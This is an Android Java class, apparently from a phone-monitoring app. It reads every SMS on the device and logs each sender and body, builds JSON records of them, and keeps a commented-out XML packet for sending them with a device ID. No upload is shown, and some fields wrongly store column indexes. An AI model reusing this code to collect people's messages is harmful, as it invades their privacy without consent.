package com.inet.android.archive;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import com.inet.android.convertdate.ConvertDate;

/**
 * Archive Sms. Watch sms
 * 
 * 
 */
public class ArchiveSms extends AsyncTask<Context, Void, Void> {
	ConvertDate date;
	Context mContext;
	private static final String TAG = "ArchiveSMS";

	public void getSmsLogs() {
		try {
			// формируем JSONobj
			JSONObject AllCallJson = new JSONObject();
			date = new ConvertDate();
			String sType = "null";
			Uri uri = Uri.parse("content://sms");
			Cursor sms_sent_cursor = mContext.getContentResolver().query(uri,
					null, null, null, null);
			// Read the sms data and store it in the list
			if (sms_sent_cursor != null) {
				if (sms_sent_cursor.moveToFirst()) {
					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {
						// Type of call retrieved from the cursor.
						int type = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));
						 Log.e("Info","SMS Type : " + type);
	                       	switch (type) {
						case 1:
							sType = "5";
							break;
						case 2:
							sType = "6";
							break;
						default:
							break;
						}
						Log.d(TAG,
								sms_sent_cursor.getString(sms_sent_cursor
										.getColumnIndex("address"))
										+ sms_sent_cursor.getString(sms_sent_cursor
												.getColumnIndex("body"))
										+ date.getData(sms_sent_cursor.getLong(sms_sent_cursor
												.getColumnIndexOrThrow("date")))
										+ sType);

						try {
							JSONObject archiveCallJson = new JSONObject();
							JSONObject infoCallJson = new JSONObject();

							archiveCallJson
									.put("time",
											date.getData(sms_sent_cursor.getLong(sms_sent_cursor
													.getColumnIndexOrThrow("date"))));
							archiveCallJson.put("type", sType);
							infoCallJson.put("tel",
									sms_sent_cursor.getColumnIndex("address"));
							infoCallJson.put("duration",
									sms_sent_cursor.getColumnIndex("body"));
							archiveCallJson.put("info", infoCallJson);
							AllCallJson.put("data", archiveCallJson);

						} catch (JSONException e) {
							// TODO Автоматически созданный блок catch
							e.printStackTrace();
						}

						sms_sent_cursor.moveToNext();

						// String sendStr = "<packet><id>"
						// + sp.getString("ID", "ID")
						// + "</id><time>"
						// + logTime()
						// + "</time><type>4</type><app>"
						// + dir
						// + "</app><ttl>"
						// + sms_sent_cursor
						// .getString(sms_sent_cursor
						// .getColumnIndex("address"))
						// + "</ttl><cdata1>"
						// + sms_sent_cursor
						// .getString(sms_sent_cursor
						// .getColumnIndex("body"))
						// + "</cdata1><ntime>" + "30"
						// + "</ntime></packetSentObserver>";

						/*
						 * if(colNames != null){ for(int k=0; k<colNames.length;
						 * k++){ Log.e(TAG, "colNames["+k+"] : " + colNames[k]);
						 * } }
						 */
					}

				}
				sms_sent_cursor.close();
				// Log.d("JsonSms", AllCallJson.toString());

			} else
				Log.e(TAG, "Send Cursor is Empty");
		} catch (Exception sggh) {
			Log.e(TAG, "Error on onChange : " + sggh.toString());
		}

	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Log.d("doInBack", "doIn");
		this.mContext = params[0];
		Log.d("doInBack", mContext.toString());
		getSmsLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
